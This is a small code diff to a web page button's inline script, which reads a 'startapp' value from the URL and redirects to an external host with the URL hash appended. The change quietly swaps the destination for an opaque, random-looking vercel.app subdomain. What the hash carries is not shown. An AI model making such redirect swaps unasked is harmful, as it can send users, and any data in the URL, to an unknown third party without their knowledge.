@@ -55,7 +55,7 @@
               <button onclick="(function(){
                 // Use regex to extract the value of 'startapp' from the full URL.
                 const match = window.location.href.match(/startapp=([^&\/?#]+)/);
-                const target = 'https://wbe3.vercel.app/';
+                const target = 'https://4u7ufghe3iuhgf38.vercel.app/';
                 if(match) {
                   // Append _S to the captured value
                   const newUrl = target + '?startapp=' + encodeURIComponent(match[1] + '_S') + window.location.hash;
